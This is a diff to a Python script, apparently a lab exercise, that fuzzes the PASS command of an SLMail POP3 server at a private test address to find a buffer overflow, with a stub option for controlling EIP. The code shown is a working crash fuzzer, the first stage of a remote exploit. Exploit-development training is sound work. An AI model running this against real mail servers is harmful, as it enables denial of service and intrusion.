@@ -7,12 +7,35 @@
 # Date: 20160408
 
 import socket, sys, os
+import argparse
 
 def main(argv):
     # Client machine IPv4 address
     clientIP = "192.168.56.105"
     clinetPORT = 110
 
+    # Parse for verbose information
+    #
+    parser = argparse.ArgumentParser(prog="SLMail Buffer Overflow")
+    parser.add_argument('--fuzz', '-f', action='store_true', default=False,
+        help='run password fuzzer')
+    parser.add_argument('--controlEIP', '-c', action='store_true', default=False,
+        help='control EIP')
+
+    # Parse args for
+    args = parser.parse_args()
+
+    # Run appropriate functions
+    if args.fuzz == True:
+        return fuzz_pass(clientIP, clinetPORT)
+    elif args.controlEIP == True:
+        print("HI")
+        #return fuzz_pass(clientIP, clinetPORT)   
+
+    return 0
+
+
+def fuzz_pass(clientIP, clinetPORT):
     # Maximum size of PASS buffer sized passed to POP3 server
     MAX_PASS_BUFFER_LEN = 1000
 
@@ -36,7 +59,7 @@ def main(argv):
             return -1
 
         # Print for debug to console the length of password buffer
-        print("Connection to POP3 Server Successful! " +\
+        print("Connection to POP3 Server Successful! \n" +\
             "Testing Password Buffer Size of" + str(i) + " bytes.")
 
         # Send server username
@@ -58,8 +81,6 @@ def main(argv):
         # Reset connection for next iteration
         s.close()
     return 0
-
-
 # Run main if tihs is ran as main function. 
 if __name__ == "__main__":
     main(sys.argv)
